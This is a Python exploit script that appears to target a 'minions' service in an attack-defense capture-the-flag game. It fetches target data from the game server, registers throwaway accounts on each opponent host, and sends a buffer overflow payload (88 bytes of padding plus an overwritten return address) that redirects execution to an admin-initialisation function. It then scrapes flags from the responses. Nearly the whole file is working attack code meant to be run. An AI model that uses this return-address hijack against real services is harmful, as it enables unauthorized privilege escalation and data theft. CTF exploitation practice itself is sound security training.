#!/usr/bin/env python3

import checklib
import requests
import sys
import json
import re
from pwn import remote, p64
# from pwn import process, context, pause

# context.log_level = 'DEBUG'

regex = re.compile('[A-Z0-9]{31}=')
ALPH = [chr(i) for i in range(65, 65 + 26)] + [chr(i) for i in range(97, 97 + 26)]

def get_attack_data() -> dict[str]:
    return requests.get(f"http://{forcad_host}/api/client/attack_data").json()

def random_chars():
    return checklib.rnd_string(10, ALPH)

def register(io: remote, username: str, password: str, secret: str):
    io.sendline(b"1")
    
    io.recvuntil(b'Enter minions name: ')
    io.sendline(username.encode())

    io.recvuntil(b'Enter minions password: ')
    io.sendline(password.encode())

    io.recvuntil(b'Enter minions secret: ')
    io.sendline(secret.encode())

    io.recvuntil(b'Enter command: ')

def login(io: remote, username: str, password: str):
    io.sendline(b"2")
    
    io.recvuntil(b'Enter minions name: ')
    io.sendline(username.encode())

    io.recvuntil(b'Enter minions password: ')
    io.sendline(password.encode())
    io.recvuntil(b'Enter command: ')

def create_family(io: remote, family_name: str, family_password: str):
    io.sendline(b"4")
    
    io.recvuntil(b'Enter family name: ')
    io.sendline(family_name.encode())

    io.recvuntil(b'Enter family password:')
    io.sendline(family_password.encode())
    io.recvuntil(b'Enter command: ')
    
def get_minion_info(io: remote, minion_name: bytes):
    io.sendline(b"7")
    
    io.recvuntil(b'Enter minion\'s name to get info: ')
    io.sendline(minion_name)

def exploit(io: remote, family_name: str):
    io.recvuntil(b"Enter family name to get info: ")
    io.sendline(family_name.encode())
    resp: str = io.recv(1000).decode()
    print(regex.findall(resp), flush=True)

PORT = 7771
ip = sys.argv[1]
forcad_host = "10.10.10.10"

INIT_GRU_ADMIN_ADDRESS = 0x40231b
payload = b"a" * 88 + p64(INIT_GRU_ADMIN_ADDRESS) # 88 - overflow offset
attack_data = get_attack_data()["minions"][ip]

# io = process("./minions")
# pause()

for data in attack_data:
    data = json.loads(data)

    rnd_username = random_chars()
    rnd_password = random_chars()
    rnd_secret = random_chars()
    
    io = remote(ip, PORT)

    register(io, rnd_username, rnd_password, rnd_secret)
    login(io, rnd_username, rnd_password)

    create_family(io, rnd_username, rnd_password)
    get_minion_info(io, payload)

    exploit(io, data["family_name"])
